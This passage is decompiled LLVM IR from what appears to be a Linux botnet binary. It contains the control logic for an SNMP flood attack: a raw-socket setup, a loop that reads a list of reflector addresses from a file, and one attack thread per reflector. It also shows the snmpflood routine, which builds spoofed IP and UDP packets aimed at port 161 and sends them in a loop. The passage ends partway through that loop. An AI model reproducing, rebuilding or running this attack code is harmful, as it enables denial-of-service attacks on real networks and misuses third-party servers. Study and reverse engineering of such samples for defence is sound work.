  %stack_var_-908 = alloca i32, align 4
  %stack_var_-892 = alloca i32, align 4
  %v15_8049eca = ptrtoint i32* %stack_var_-892 to i32
  store i32 %v15_8049eca, i32* @eax, align 4
  store i32 %arg1, i32* %stack_var_-908, align 4
  %v7_8049edb = ptrtoint i32* %stack_var_-908 to i32
  %v1_8049ede = call i32 @mfork(i32 %arg1)
  store i32 %v1_8049ede, i32* %eax.global-to-local, align 4
  %v1_8049ee6 = icmp eq i32 %v1_8049ede, 0
  %v1_8049ee8 = icmp eq i1 %v1_8049ee6, false
  br i1 %v1_8049ee8, label %dec_label_pc_804a2bd, label %dec_label_pc_8049eee

dec_label_pc_8049eee:                             ; preds = %entry
  store i32 2, i32* %stack_var_-908, align 4
  %v3_8049efa = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_8049efa, i32* %eax.global-to-local, align 4
  %v5_8049f05 = icmp slt i32 %v3_8049efa, 0
  %v1_8049f09 = icmp eq i1 %v5_8049f05, false
  br i1 %v1_8049f09, label %dec_label_pc_8049f15, label %dec_label_pc_8049f0b

dec_label_pc_8049f0b:                             ; preds = %dec_label_pc_8049eee
  store i32 1, i32* %stack_var_-908, align 4
  %v1_8049f10 = call i32 @__GI_exit(i32 1)
  store i32 %v1_8049f10, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049f15

dec_label_pc_8049f15:                             ; preds = %dec_label_pc_8049eee, %dec_label_pc_8049f0b
  %v4_8049f15 = add i32 %arg2, -4
  %v9_8049f15 = sub i32 3, %arg2
  %v10_8049f15 = and i32 %v9_8049f15, %arg2
  %v11_8049f15 = icmp slt i32 %v10_8049f15, 0
  %v12_8049f15 = icmp eq i32 %v4_8049f15, 0
  %v13_8049f15 = icmp slt i32 %v4_8049f15, 0
  %v3_8049f19 = icmp eq i1 %v13_8049f15, %v11_8049f15
  %v4_8049f19 = icmp eq i1 %v12_8049f15, false
  %v5_8049f19 = and i1 %v4_8049f19, %v3_8049f19
  br i1 %v5_8049f19, label %dec_label_pc_8049f15.dec_label_pc_8049f3e_crit_edge, label %dec_label_pc_8049f1b

dec_label_pc_8049f15.dec_label_pc_8049f3e_crit_edge: ; preds = %dec_label_pc_8049f15
  br label %dec_label_pc_8049f3e

dec_label_pc_8049f1b:                             ; preds = %dec_label_pc_8049f15
  %v0_8049f1b = load i32, i32* @global_var_807cb70.29, align 16
  store i32 %v0_8049f1b, i32* %eax.global-to-local, align 4
  %v3_8049f2c = call i32 @Send(i32 %v0_8049f1b, i32 ptrtoint ([67 x i8]* @global_var_8069094.86 to i32))
  store i32 %v3_8049f2c, i32* %eax.global-to-local, align 4
  %v1_8049f39 = call i32 @__GI_exit(i32 -1)
  store i32 %v1_8049f39, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049f3e

dec_label_pc_8049f3e:                             ; preds = %dec_label_pc_8049f15.dec_label_pc_8049f3e_crit_edge, %dec_label_pc_8049f1b
  %v1_8049f41 = add i32 %arg3, 12
  store i32 %v1_8049f41, i32* %eax.global-to-local, align 4
  %v1_8049f44 = inttoptr i32 %v1_8049f41 to i32*
  %v2_8049f44 = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f44, i32* %edx.global-to-local, align 4
  store i32 %v1_8049f41, i32* %eax.global-to-local, align 4
  %v2_8049f4c = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f4c, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049f41, i32* %eax.global-to-local, align 4
  %v2_8049f54 = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f54, i32* @ebx, align 4
  store i32 %v1_8049f41, i32* %eax.global-to-local, align 4
  %v2_8049f5c = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f5c, i32* %eax.global-to-local, align 4
  %v2_8049f5e = ptrtoint i32* %stack_var_-568 to i32
  store i32 %v2_8049f5e, i32* @esi, align 4
  %v3_8049f71 = call i32 @sprintf(i32 %v2_8049f5e, i32 ptrtoint ([130 x i8]* @global_var_80690d8.87 to i32))
  store i32 %v2_8049f5e, i32* %eax.global-to-local, align 4
  %v1_8049f83 = call i32 @system(i32 %v2_8049f5e)
  store i32 %v1_8049f83, i32* %eax.global-to-local, align 4
  store i32 0, i32* @global_var_807dca0.85, align 32
  %v1_8049f9d = call i32 @malloc(i32 256)
  store i32 %v1_8049f9d, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v4_8049fb9 = inttoptr i32 %v1_8049f9d to i8*
  %v5_8049fb9 = call i32 @__GI_memset(i8* %v4_8049fb9, i32 0, i32 256)
  %v3_8049fc4 = and i32 %v5_8049fb9, -256
  %v2_8049fcf = ptrtoint i32* %stack_var_-599 to i32
  %tmp60 = bitcast i32* %stack_var_-599 to i8*
  store i32 %v2_8049fcf, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 31, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049fc4, i32* %eax.global-to-local, align 4
  %v5_8049fdd = call i8* @_memset(i8* %tmp60, i32 %v3_8049fc4, i32 31)
  %v6_8049fdd = ptrtoint i8* %v5_8049fdd to i32
  store i32 %v6_8049fdd, i32* %ecx.global-to-local, align 4
  %v2_8049fea = ptrtoint i32* %stack_var_-855 to i32
  store i32 %v2_8049fea, i32* %edx.global-to-local, align 4
  store i32 255, i32* %eax.global-to-local, align 4
  %v4_8049ffc = bitcast i32* %stack_var_-855 to i8*
  %v5_8049ffc = call i32 @__GI_memset(i8* %v4_8049ffc, i32 0, i32 255)
  store i32 %v5_8049ffc, i32* @eax, align 4
  %v3_804a018 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_806915c.89 to i32), i32 ptrtoint ([2 x i8]* @global_var_806915a.88 to i32))
  store i32 %v3_804a018, i32* %eax.global-to-local, align 4
  %v3_804a02e = inttoptr i32 %v5_8049fb9 to i8*
  br label %dec_label_pc_804a039

dec_label_pc_804a025:                             ; preds = %dec_label_pc_804a039
  %v4_804a02e = call i32 @ParseResolverLine(i8* %v3_804a02e, i32 %stack_var_-40.0)
  store i32 %v4_804a02e, i32* %eax.global-to-local, align 4
  %v4_804a036 = add i32 %stack_var_-40.0, 1
  br label %dec_label_pc_804a039

dec_label_pc_804a039:                             ; preds = %dec_label_pc_8049f3e, %dec_label_pc_804a025
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_8049f3e ], [ %v4_804a036, %dec_label_pc_804a025 ]
  %v4_804a047 = call i32 @fgets(i32 %v5_8049fb9, i32 256, i32 %v3_804a018)
  store i32 %v4_804a047, i32* @eax, align 4
  %v1_804a04f = icmp eq i32 %v4_804a047, 0
  %v1_804a051 = icmp eq i1 %v1_804a04f, false
  br i1 %v1_804a051, label %dec_label_pc_804a025, label %dec_label_pc_804a053

dec_label_pc_804a053:                             ; preds = %dec_label_pc_804a039
  %v1_804a05d = add i32 %arg3, 16
  store i32 %v1_804a05d, i32* %eax.global-to-local, align 4
  %v1_804a060 = inttoptr i32 %v1_804a05d to i32*
  %v2_804a060 = load i32, i32* %v1_804a060, align 4
  store i32 %v2_804a060, i32* %eax.global-to-local, align 4
  %v1_804a066 = call i32 @atol(i32 %v2_804a060)
  %v0_804a071 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804a071, i32* %eax.global-to-local, align 4
  %v1_804a076 = add i32 %v0_804a071, 532
  %v2_804a076 = inttoptr i32 %v1_804a076 to i32*
  %v3_804a076 = load i32, i32* %v2_804a076, align 4
  %v2_804a082 = mul i32 %v1_804a066, 4
  %v1_804a088 = add i32 %v2_804a082, 30
  %v2_804a08b = and i32 %v1_804a088, -16
  %v2_804a091 = sub i32 %v7_8049edb, %v2_804a08b
  %v1_804a09f = add i32 %v2_804a091, 15
  %v2_804a0a2 = and i32 %v1_804a09f, -16
  store i32 %v2_804a0a2, i32* %stack_var_-892, align 4
  store i32 %v2_804a0a2, i32* %eax.global-to-local, align 4
  %v1_804a0c3 = add i32 %v2_804a091, -16
  %v2_804a0c3 = inttoptr i32 %v1_804a0c3 to i32*
  store i32 0, i32* %v2_804a0c3, align 4
  %v0_804a0c5 = load i32, i32* %stack_var_-892, align 4
  %v1_804a0c5 = call i32 @htons(i32 %v0_804a0c5)
  %v0_804a0ca = load i32, i32* @esp, align 4
  %v1_804a0d7 = add i32 %arg3, 4
  store i32 %v1_804a0d7, i32* %eax.global-to-local, align 4
  %v1_804a0da = inttoptr i32 %v1_804a0d7 to i32*
  %v2_804a0da = load i32, i32* %v1_804a0da, align 4
  store i32 %v2_804a0da, i32* %eax.global-to-local, align 4
  %v3_804a0df = inttoptr i32 %v0_804a0ca to i32*
  store i32 %v2_804a0da, i32* %v3_804a0df, align 4
  %sext = mul i32 %v1_804a0c5, 65536
  %v1_804a0e0 = sdiv i32 %sext, 65536
  %v2_804a0e0 = call i32 @inet_addr(i32 %v1_804a0e0)
  %v0_804a0e5 = load i32, i32* @esp, align 4
  store i32 %v2_804a082, i32* %edx.global-to-local, align 4
  %v2_804a0ff = mul i32 %v1_804a066, 28
  %v1_804a104 = add i32 %v2_804a0ff, 30
  %v2_804a107 = and i32 %v1_804a104, -16
  %v1_804a0e5 = sub i32 16, %v2_804a107
  %v2_804a10d = add i32 %v1_804a0e5, %v0_804a0e5
  %v1_804a11b = add i32 %v2_804a10d, 15
  %v2_804a11e = and i32 %v1_804a11b, -16
  %v1_804a136 = add i32 %arg3, 8
  store i32 %v1_804a136, i32* %eax.global-to-local, align 4
  %v1_804a139 = inttoptr i32 %v1_804a136 to i32*
  %v2_804a139 = load i32, i32* %v1_804a139, align 4
  store i32 %v2_804a139, i32* %eax.global-to-local, align 4
  %v2_804a13e = add i32 %v2_804a10d, -16
  %v3_804a13e = inttoptr i32 %v2_804a13e to i32*
  store i32 %v2_804a139, i32* %v3_804a13e, align 4
  %v1_804a13f = call i32 @atol(i32 %v2_804a11e)
  %v0_804a144 = load i32, i32* @esp, align 4
  %tmp61 = bitcast i8** %stack_var_-20 to i32*
  store i32 %v1_804a13f, i32* %tmp61, align 4
  store i32 %v1_804a0d7, i32* %eax.global-to-local, align 4
  %v2_804a150 = load i32, i32* %v1_804a0da, align 4
  store i32 %v2_804a150, i32* %eax.global-to-local, align 4
  %v6_804a155 = add i32 %v0_804a144, 8
  %v7_804a155 = inttoptr i32 %v6_804a155 to i32*
  store i32 %v1_804a13f, i32* %v7_804a155, align 4
  %v0_804a158 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a158 = add i32 %v0_804a144, 4
  %v3_804a158 = inttoptr i32 %v2_804a158 to i32*
  store i32 %v0_804a158, i32* %v3_804a158, align 4
  %v2_804a159 = inttoptr i32 %v0_804a144 to i32*
  store i32 ptrtoint ([15 x i8]* @global_var_8069164.90 to i32), i32* %v2_804a159, align 4
  %v0_804a15e = load i8*, i8** %stack_var_-20, align 4
  %v3_804a15e = call i32 (i8*, ...) @printf(i8* %v0_804a15e)
  %v0_804a163 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a24467 = icmp sgt i32 %v1_804a066, 0
  br i1 %v5_804a24467, label %dec_label_pc_804a172.lr.ph, label %dec_label_pc_804a24a

dec_label_pc_804a172.lr.ph:                       ; preds = %dec_label_pc_804a053
  %v3_804a1a6 = or i32 %v2_804a11e, 8
  %v3_804a1e1 = or i32 %v2_804a11e, 4
  br label %dec_label_pc_804a172

dec_label_pc_804a172:                             ; preds = %dec_label_pc_804a172, %dec_label_pc_804a172.lr.ph
  %storemerge68 = phi i32 [ 0, %dec_label_pc_804a172.lr.ph ], [ %v4_804a23b, %dec_label_pc_804a172 ]
  %v2_804a186 = mul i32 %storemerge68, 28
  %v3_804a18b = add i32 %v2_804a186, %v2_804a11e
  %v4_804a18b = inttoptr i32 %v3_804a18b to i32*
  store i32 %storemerge68, i32* %v4_804a18b, align 4
  store i32 %v2_804a11e, i32* %ecx.global-to-local, align 4
  %v2_804a194 = mul i32 %storemerge68, 4
  store i32 %v2_804a186, i32* %edx.global-to-local, align 4
  %v4_804a1a6 = add i32 %v3_804a1a6, %v2_804a186
  %v5_804a1a6 = inttoptr i32 %v4_804a1a6 to i32*
  store i32 2, i32* %v5_804a1a6, align 4
  %v1_804a1b0 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a1b0 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a1b0 = add i32 %v1_804a1b0, 12
  %v4_804a1b0 = add i32 %v3_804a1b0, %v2_804a1b0
  %v5_804a1b0 = inttoptr i32 %v4_804a1b0 to i32*
  store i32 %v2_804a0e0, i32* %v5_804a1b0, align 4
  %v1_804a1ba = load i32, i32* %edx.global-to-local, align 4
  %v2_804a1ba = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a1ba = add i32 %v1_804a1ba, 16
  %v4_804a1ba = add i32 %v3_804a1ba, %v2_804a1ba
  %v5_804a1ba = inttoptr i32 %v4_804a1ba to i32*
  %v1_804a1c4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a1c4 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a1c4 = add i32 %v1_804a1c4, 20
  %v4_804a1c4 = add i32 %v3_804a1c4, %v2_804a1c4
  %v5_804a1c4 = inttoptr i32 %v4_804a1c4 to i32*
  %v4_804a1e1 = add i32 %v3_804a1e1, %v2_804a186
  %v5_804a1e1 = inttoptr i32 %v4_804a1e1 to i32*
  store i32 %v3_804a076, i32* %v5_804a1e1, align 4
  %v3_804a200 = load i8*, i8** %stack_var_-20, align 4
  %v4_804a200 = ptrtoint i8* %v3_804a200 to i32
  %v2_804a203 = add i32 %v3_804a18b, 24
  %v3_804a203 = inttoptr i32 %v2_804a203 to i32*
  store i32 %v4_804a200, i32* %v3_804a203, align 4
  store i32 %v3_804a18b, i32* @ecx, align 4
  store i32 %v2_804a0a2, i32* %edx.global-to-local, align 4
  %v2_804a227 = add i32 %v2_804a194, %v2_804a0a2
  store i32 %v2_804a227, i32* %eax.global-to-local, align 4
  %v1_804a22a = load i32, i32* @esp, align 4
  %v2_804a22a = add i32 %v1_804a22a, -4
  %v3_804a22a = inttoptr i32 %v2_804a22a to i32*
  store i32 %v3_804a18b, i32* %v3_804a22a, align 4
  %v1_804a22b = add i32 %v1_804a22a, -8
  %v2_804a22b = inttoptr i32 %v1_804a22b to i32*
  store i32 134518376, i32* %v2_804a22b, align 4
  %v1_804a230 = add i32 %v1_804a22a, -12
  %v2_804a230 = inttoptr i32 %v1_804a230 to i32*
  store i32 0, i32* %v2_804a230, align 4
  %v0_804a232 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a232 = add i32 %v1_804a22a, -16
  %v3_804a232 = inttoptr i32 %v2_804a232 to i32*
  store i32 %v0_804a232, i32* %v3_804a232, align 4
  %v3_804a233 = load i8*, i8** %stack_var_-20, align 4
  %v4_804a233 = ptrtoint i8* %v3_804a233 to i32
  %v5_804a233 = inttoptr i32 %storemerge68 to i32*
  %v6_804a233 = call i32 @pthread_create(i32* %v5_804a233, i32 %v1_804a066, i32 %v3_804a076, i32 %v4_804a233)
  %v0_804a238 = load i32, i32* @esp, align 4
  %v4_804a23b = add nuw nsw i32 %storemerge68, 1
  store i32 %v4_804a23b, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804a23b, %v1_804a066
  br i1 %exitcond, label %dec_label_pc_804a24a, label %dec_label_pc_804a172

dec_label_pc_804a24a:                             ; preds = %dec_label_pc_804a172, %dec_label_pc_804a053
  %v0_804a260.lcssa.in = phi i32 [ %v0_804a163, %dec_label_pc_804a053 ], [ %v0_804a238, %dec_label_pc_804a172 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_804a053 ], [ %v1_804a066, %dec_label_pc_804a172 ]
  store i32 %v1_804a136, i32* %eax.global-to-local, align 4
  %v2_804a250 = load i32, i32* %v1_804a139, align 4
  store i32 %v2_804a250, i32* %edx.global-to-local, align 4
  store i32 %v1_804a0d7, i32* %eax.global-to-local, align 4
  %v2_804a258 = load i32, i32* %v1_804a0da, align 4
  store i32 %v2_804a258, i32* %eax.global-to-local, align 4
  %v0_804a25a = load i32, i32* @global_var_807cb70.29, align 16
  store i32 %v0_804a25a, i32* %ecx.global-to-local, align 4
  %v3_804a263 = inttoptr i32 %v0_804a260.lcssa.in to i32*
  store i32 %v2_804a250, i32* %v3_804a263, align 4
  %v0_804a264 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a264 = add i32 %v0_804a260.lcssa.in, -4
  %v3_804a264 = inttoptr i32 %v2_804a264 to i32*
  store i32 %v0_804a264, i32* %v3_804a264, align 4
  %v5_804a265 = add i32 %v0_804a260.lcssa.in, -8
  %v6_804a265 = inttoptr i32 %v5_804a265 to i32*
  store i32 %arg1, i32* %v6_804a265, align 4
  %v1_804a268 = add i32 %v0_804a260.lcssa.in, -12
  %v2_804a268 = inttoptr i32 %v1_804a268 to i32*
  store i32 ptrtoint ([36 x i8]* @global_var_8069174.91 to i32), i32* %v2_804a268, align 4
  %v0_804a26d = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a26d = add i32 %v0_804a260.lcssa.in, -16
  %v3_804a26d = inttoptr i32 %v2_804a26d to i32*
  store i32 %v0_804a26d, i32* %v3_804a26d, align 4
  %v2_804a26e = call i32 @Send(i32 %storemerge.lcssa, i32 %v1_804a066)
  %v0_804a273 = load i32, i32* @esp, align 4
  %v0_804a276 = load i8*, i8** @global_var_8073d6c, align 4
  %v1_804a276 = ptrtoint i8* %v0_804a276 to i32
  store i32 %v1_804a276, i32* %eax.global-to-local, align 4
  %v2_804a27b = add i32 %v0_804a273, 28
  %v3_804a27b = inttoptr i32 %v2_804a27b to i32*
  store i32 %v1_804a276, i32* %v3_804a27b, align 4
  %v1_804a27c = add i32 %v0_804a273, 24
  %v2_804a27c = inttoptr i32 %v1_804a27c to i32*
  store i32 26, i32* %v2_804a27c, align 4
  %v1_804a27e = add i32 %v0_804a273, 20
  %v2_804a27e = inttoptr i32 %v1_804a27e to i32*
  store i32 1, i32* %v2_804a27e, align 4
  %v1_804a280 = add i32 %v0_804a273, 16
  %v2_804a280 = inttoptr i32 %v1_804a280 to i32*
  store i32 ptrtoint ([27 x i8]* @global_var_8069198.92 to i32), i32* %v2_804a280, align 4
  %v3_804a285 = load i8*, i8** %stack_var_-20, align 4
  %v4_804a285 = ptrtoint i8* %v3_804a285 to i32
  %v5_804a285 = call i32 @fwrite(i32 %storemerge.lcssa, i32 %v1_804a066, i32 %v3_804a076, i32 %v4_804a285)
  store i32 %v5_804a285, i32* %eax.global-to-local, align 4
  %v0_804a28a = load i32, i32* @esp, align 4
  %v7_804a291 = icmp sgt i32 %arg2, 4
  br i1 %v7_804a291, label %dec_label_pc_804a293, label %dec_label_pc_804a2b3

dec_label_pc_804a293:                             ; preds = %dec_label_pc_804a24a
  %v1_804a296 = add i32 %arg3, 20
  store i32 %v1_804a296, i32* %eax.global-to-local, align 4
  %v1_804a299 = inttoptr i32 %v1_804a296 to i32*
  %v2_804a299 = load i32, i32* %v1_804a299, align 4
  store i32 %v2_804a299, i32* %eax.global-to-local, align 4
  %v3_804a29e = inttoptr i32 %v0_804a28a to i32*
  store i32 %v2_804a299, i32* %v3_804a29e, align 4
  %v1_804a29f = call i32 @atol(i32 %storemerge.lcssa)
  store i32 %v1_804a29f, i32* %eax.global-to-local, align 4
  %v0_804a2a4 = load i32, i32* @esp, align 4
  %v3_804a2aa = inttoptr i32 %v0_804a2a4 to i32*
  store i32 %v1_804a29f, i32* %v3_804a2aa, align 4
  %v1_804a2ab = call i32 @sleep(i32 %storemerge.lcssa)
  store i32 %v1_804a2ab, i32* %eax.global-to-local, align 4
  %v0_804a2b0 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a2b3

dec_label_pc_804a2b3:                             ; preds = %dec_label_pc_804a24a, %dec_label_pc_804a293
  %v0_804a2b3.in = phi i32 [ %v0_804a28a, %dec_label_pc_804a24a ], [ %v0_804a2b0, %dec_label_pc_804a293 ]
  %v2_804a2b6 = inttoptr i32 %v0_804a2b3.in to i32*
  store i32 1, i32* %v2_804a2b6, align 4
  %v1_804a2b8 = call i32 @__GI_exit(i32 %storemerge.lcssa)
  store i32 %v1_804a2b8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a2bd

dec_label_pc_804a2bd:                             ; preds = %entry, %dec_label_pc_804a2b3
  %v0_804a2ca = phi i32 [ %v1_8049ede, %entry ], [ %v1_804a2b8, %dec_label_pc_804a2b3 ]
  ret i32 %v0_804a2ca

; uselistorder directives
  uselistorder i32 %storemerge.lcssa, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v2_804a186, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge68, { 4, 3, 0, 2, 1 }
  uselistorder i32 %v0_804a144, { 2, 0, 1 }
  uselistorder i32 %v2_804a11e, { 4, 2, 0, 1, 3 }
  uselistorder i32 %v2_804a10d, { 1, 0 }
  uselistorder i32 %v2_804a0a2, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804a066, { 4, 5, 0, 1, 6, 2, 7, 3 }
  uselistorder i32 %v3_8049fc4, { 1, 0 }
  uselistorder i32 %v5_8049fb9, { 1, 0, 2 }
  uselistorder i32 %v4_8049f15, { 1, 0 }
  uselistorder i32* %stack_var_-908, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-20, { 4, 2, 1, 3, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 %arg3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a2bd, { 1, 0 }
  uselistorder label %dec_label_pc_804a2b3, { 1, 0 }
  uselistorder label %dec_label_pc_804a039, { 1, 0 }
  uselistorder label %dec_label_pc_8049f3e, { 1, 0 }
  uselistorder label %dec_label_pc_8049f15, { 1, 0 }
}

define i32 @setup_snmp_header(i16* %arg1) local_unnamed_addr {
entry:
  %v1_804a2d9 = call i32 @htons(i32 5678)
  %v2_804a2d9 = trunc i32 %v1_804a2d9 to i16
  %v4_804a2e3 = ptrtoint i16* %arg1 to i32
  store i16 %v2_804a2d9, i16* %arg1, align 2
  %v1_804a2f1 = call i32 @htons(i32 161)
  %v2_804a2f1 = trunc i32 %v1_804a2f1 to i16
  %v3_804a2fe = add i32 %v4_804a2e3, 2
  %v4_804a2fe = inttoptr i32 %v3_804a2fe to i16*
  store i16 %v2_804a2f1, i16* %v4_804a2fe, align 2
  %v1_804a305 = add i32 %v4_804a2e3, 6
  %v2_804a305 = inttoptr i32 %v1_804a305 to i16*
  store i16 0, i16* %v2_804a305, align 2
  %v1_804a30e = add i32 %v4_804a2e3, 8
  %v3_804a323 = inttoptr i32 %v1_804a30e to i16*
  %v4_804a323 = call i32 @memcpy(i16* %v3_804a323, i32 ptrtoint (i32* @global_var_80691b4.93 to i32), i32 67)
  %v1_804a330 = call i32 @htons(i32 75)
  %v2_804a330 = trunc i32 %v1_804a330 to i16
  %v4_804a33d = add i32 %v4_804a2e3, 4
  %v5_804a33d = inttoptr i32 %v4_804a33d to i16*
  store i16 %v2_804a330, i16* %v5_804a33d, align 2
  ret i32 %v4_804a2e3

; uselistorder directives
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @snmpflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8240 = alloca i32, align 4
  %stack_var_-8220 = alloca i32, align 4
  %v2_804a352 = ptrtoint i32* %stack_var_-8220 to i32
  %v1_804a35e = add i32 %v2_804a352, 20
  %v5_804a361 = inttoptr i32 %v1_804a35e to i16*
  %v1_804a370 = add i32 %arg1, 12
  %v2_804a370 = inttoptr i32 %v1_804a370 to i32*
  %v3_804a370 = load i32, i32* %v2_804a370, align 4
  %v1_804a38e = add i32 %arg1, 4
  %v2_804a38e = inttoptr i32 %v1_804a38e to i32*
  %v3_804a38e = load i32, i32* %v2_804a38e, align 4
  %v4_804a39d = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804a3a8 = icmp slt i32 %v4_804a39d, 0
  %v1_804a3ac = icmp eq i1 %v5_804a3a8, false
  br i1 %v1_804a3ac, label %entry.dec_label_pc_804a3cf_crit_edge, label %dec_label_pc_804a3ae

entry.dec_label_pc_804a3cf_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804a3cf

dec_label_pc_804a3ae:                             ; preds = %entry
  %v0_804a3ae = load i8*, i8** @global_var_8073d70, align 4
  %v1_804a3ae = ptrtoint i8* %v0_804a3ae to i32
  %v6_804a3bd = call i32 @fwrite(i32 ptrtoint ([28 x i8]* @global_var_80691f8.94 to i32), i32 1, i32 27, i32 %v1_804a3ae)
  %v2_804a3ca = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804a3cf

dec_label_pc_804a3cf:                             ; preds = %entry.dec_label_pc_804a3cf_crit_edge, %dec_label_pc_804a3ae
  %v3_804a3d4 = call i32 @__GI_time(i32* null)
  %v2_804a3dd = call i32 @init_rand(i32 %v3_804a3d4)
  %tmp39 = bitcast i32* %stack_var_-8220 to i8*
  %v5_804a3f9 = call i32 @__GI_memset(i8* %tmp39, i32 0, i32 8192)
  store i32 %v5_804a3f9, i32* @eax, align 4
  %v3_804a407 = call i32 @setup_ip_header(i8* %tmp39)
  %v3_804a415 = call i32 @setup_snmp_header(i16* %v5_804a361)
  %v0_804a41d = call i32 @random()
  %v2_804a42d = ashr i32 %v0_804a41d, 31
  %v2_804a430 = zext i32 %v0_804a41d to i64
  %v4_804a430 = zext i32 %v2_804a42d to i64
  %v5_804a430 = mul nuw i64 %v4_804a430, 4294967296
  %v6_804a430 = or i64 %v5_804a430, %v2_804a430
  %v10_804a430 = srem i64 %v6_804a430, 65535
  %v11_804a430 = trunc i64 %v10_804a430 to i32
  %v1_804a434 = add i32 %v11_804a430, 64510
  %v1_804a439 = urem i32 %v1_804a434, 65536
  %v2_804a442 = call i32 @htons(i32 %v1_804a439)
  %v3_804a442 = trunc i32 %v2_804a442 to i16
  store i16 %v3_804a442, i16* %v5_804a361, align 4
  %v2_804a45b = add i32 %v2_804a352, 12
  %v3_804a45b = inttoptr i32 %v2_804a45b to i32*
  store i32 %v3_804a370, i32* %v3_804a45b, align 4
  %v1_804a461 = add i32 %v3_804a38e, 4
  %v2_804a461 = inttoptr i32 %v1_804a461 to i32*
  %v3_804a461 = load i32, i32* %v2_804a461, align 4
  %v2_804a467 = add i32 %v2_804a352, 16
  %v3_804a467 = inttoptr i32 %v2_804a467 to i32*
  store i32 %v3_804a461, i32* %v3_804a467, align 4
  %v1_804a46d = or i32 %v2_804a352, 2
  %v2_804a46d = inttoptr i32 %v1_804a46d to i16*
  %v3_804a46d = load i16, i16* %v2_804a46d, align 2
  %v3_804a471 = udiv i16 %v3_804a46d, 2
  %v9_804a471 = zext i16 %v3_804a471 to i32
  %v3_804a481 = bitcast i32* %stack_var_-8220 to i16*
  %v4_804a481 = call i32 @csum(i16* %v3_804a481, i32 %v9_804a471)
  %v5_804a481 = trunc i32 %v4_804a481 to i16
  %v3_804a48e = add i32 %v2_804a352, 10
  %v4_804a48e = inttoptr i32 %v3_804a48e to i16*
  store i16 %v5_804a481, i16* %v4_804a48e, align 2
  store i32 1, i32* %stack_var_-8240, align 4
  %v2_804a49c = ptrtoint i32* %stack_var_-8240 to i32
  %v6_804a4b4 = call i32 @__GI_setsockopt(i32 %v4_804a39d, i32 0, i32 3, i32 %v2_804a49c, i32 4)
  %v2_804a4bc = icmp slt i32 %v6_804a4b4, 0
  %v1_804a4be = icmp eq i1 %v2_804a4bc, false
  br i1 %v1_804a4be, label %dec_label_pc_804a4e1, label %dec_label_pc_804a4c0

dec_label_pc_804a4c0:                             ; preds = %dec_label_pc_804a3cf
  %v0_804a4c0 = load i8*, i8** @global_var_8073d70, align 4
  %v1_804a4c0 = ptrtoint i8* %v0_804a4c0 to i32
  %v6_804a4cf = call i32 @fwrite(i32 ptrtoint ([43 x i8]* @global_var_8069214.95 to i32), i32 1, i32 42, i32 %v1_804a4c0)
  %v2_804a4dc = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804a4e1

dec_label_pc_804a4e1:                             ; preds = %dec_label_pc_804a3cf, %dec_label_pc_804a4c0
  %v3_804a4e6 = call i32 @__GI_time(i32* null)
  %v2_804a4ef = call i32 @init_rand(i32 %v3_804a4e6)
  %v3_804a55b = add i32 %v2_804a352, 4
  %v4_804a55b = inttoptr i32 %v3_804a55b to i16*
  br label %dec_label_pc_804a501

dec_label_pc_804a501:                             ; preds = %dec_label_pc_804a5ba, %dec_label_pc_804a4e1
  %stack_var_-16.0 = phi i32 [ %v3_804a38e, %dec_label_pc_804a4e1 ], [ %v3_804a530, %dec_label_pc_804a5ba ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804a4e1 ], [ %v4_804a5ba, %dec_label_pc_804a5ba ]
  %v3_804a509 = load i16, i16* %v2_804a46d, align 2
  %v4_804a509 = zext i16 %v3_804a509 to i32
  %v7_804a525 = call i32 @sendto(i32 %v4_804a39d, i32 %v2_804a352, i32 %v4_804a509, i32 0, i32 %stack_var_-16.0, i32 16)
  %v1_804a530 = add i32 %stack_var_-16.0, 532
  %v2_804a530 = inttoptr i32 %v1_804a530 to i32*
  %v3_804a530 = load i32, i32* %v2_804a530, align 4
  %v1_804a53c = add i32 %v3_804a530, 4
  %v2_804a53c = inttoptr i32 %v1_804a53c to i32*
